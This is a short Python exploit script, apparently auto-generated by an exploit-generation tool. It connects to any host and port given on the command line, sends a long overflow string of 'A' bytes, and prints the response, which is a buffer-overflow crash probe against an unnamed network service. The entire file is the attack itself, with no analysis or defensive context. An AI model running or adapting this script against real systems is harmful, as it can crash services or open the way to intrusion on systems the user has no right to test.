#!/usr/bin/env python

import sys
import socket
import time
import argparse

import nclib

parser = argparse.ArgumentParser(description="Launch exploit.")
parser.add_argument('host', type=str)
parser.add_argument('port', type=int)
parser.add_argument('-c', '--cmd', nargs="*", type=str)

args = parser.parse_args()

############## render actions #################
# RexOpenChannelAction
r = nclib.Netcat((args.host, args.port), udp=False, verbose=True)


# RexSendAction
r.send(b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA')

print(r.recvall())
